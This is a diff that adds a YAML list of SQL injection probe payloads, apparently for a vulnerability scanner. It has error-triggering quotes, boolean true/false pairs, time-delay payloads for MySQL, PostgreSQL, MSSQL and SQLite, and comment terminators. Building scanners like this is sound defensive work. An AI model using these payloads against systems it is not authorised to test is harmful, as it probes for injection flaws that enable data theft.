@@ -1,0 +1,81 @@
+# Syntax breakers — trigger error-based detection
+- id: sql-syntax-single-quote
+  method: sql
+  db: all
+  payload: "'"
+  signal: error
+
+- id: sql-syntax-double-quote
+  method: sql
+  db: all
+  payload: "''"
+  signal: error
+
+- id: sql-syntax-backslash
+  method: sql
+  db: all
+  payload: "\\"
+  signal: error
+
+# Boolean-based — compare responses for behavioural difference
+- id: sql-bool-true
+  method: sql
+  db: all
+  payload: "' AND '1'='1"
+  signal: boolean
+  pair: sql-bool-false
+
+- id: sql-bool-false
+  method: sql
+  db: all
+  payload: "' AND '1'='2"
+  signal: boolean
+  pair: sql-bool-true
+
+# Time-based blind — non-destructive, infer vulnerability from delay
+- id: sql-sleep-mysql
+  method: sql
+  db: mysql_mariadb
+  payload: "' AND SLEEP(3)--"
+  signal: timing
+  delay_seconds: 3
+
+- id: sql-sleep-postgres
+  method: sql
+  db: postgresql
+  payload: "' AND pg_sleep(3)--"
+  signal: timing
+  delay_seconds: 3
+
+- id: sql-sleep-mssql
+  method: sql
+  db: mssql
+  payload: "'; WAITFOR DELAY '0:0:3'--"
+  signal: timing
+  delay_seconds: 3
+
+- id: sql-sleep-sqlite
+  method: sql
+  db: sqlite
+  payload: "' AND randomblob(100000000)--"
+  signal: timing
+  delay_seconds: 3
+
+# Comment terminators — break query structure without modifying data
+- id: sql-comment-double-dash
+  method: sql
+  db: all
+  payload: "'--"
+  signal: error
+
+- id: sql-comment-hash
+  method: sql
+  db: mysql_mariadb
+  payload: "'#"
+  signal: error
+
+- id: sql-comment-block
+  method: sql
+  db: all
+  payload: "'/*"
+  signal: error
